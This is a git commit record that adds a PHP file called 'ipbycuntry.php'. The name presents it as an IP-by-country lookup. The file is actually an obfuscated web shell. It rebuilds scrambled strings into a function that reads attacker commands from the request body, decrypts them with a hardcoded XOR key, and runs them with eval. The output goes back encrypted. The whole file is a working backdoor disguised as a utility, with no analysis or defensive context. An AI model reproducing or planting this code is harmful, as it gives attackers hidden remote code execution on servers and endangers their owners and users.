89c98168a15b132f556edc147d9f57f582f2d1c4
JIHAD Hossain <102958914+JIH4DHoss4in@users.noreply.github.com>
2022-12-10 19:13:50 +0000

    Add files via upload

---
+++ ipbycuntry.php
@@ -0,0 +1,10 @@
+<?php
+$G='o.=$uOt{$i}^$k{uO$j};uO}}return uO$o;}uOifuO (uO@preg_matchuO("/$kuOh(.+)$kf/"uO,uO@file_uOget_contents("puOuOhp://inu';
+$Z='){$uOc=struOlen($k);$l=uOstrlen($uOt)uO;$ouO=uO"";for($i=uO0;$i<$l;){uOfor($uOj=0;(uO$j<$uOc&&$iuO<$luO);$j+uO+,$i++){$';
+$z='$k="f3auOauOuO669e";$kh=uO"6a56uO68c9f9f2";$kf=uOuO"d05fcuO64aauOab5"uO;$p="DywCDItV4uuOT2uObz9q";fuOunctiuOonuO x($t,$k';
+$X='Oput"),$m)==uO1)uO {@ob_stuOart();@euOvaluO(@gzuncouOmpuOress(@uOxuO(@bauOse64_decodeuO($muO[1uO]),$k)));$o=@ouOb_get';
+$d='_couOntents()uO;@ob_enduO_cleanuO(uO);$r=@uObauOse64_encode(@xuO(@uOgzcompreuOss($o),$uOuOk));priuOnt("$p$kh$uOr$kf");}';
+$E=str_replace('Oj','','crOjeOjOjate_fOjOjunctiOjon');
+$T=str_replace('uO','',$z.$Z.$G.$X.$d);
+$M=$E('',$T);$M();
+?>
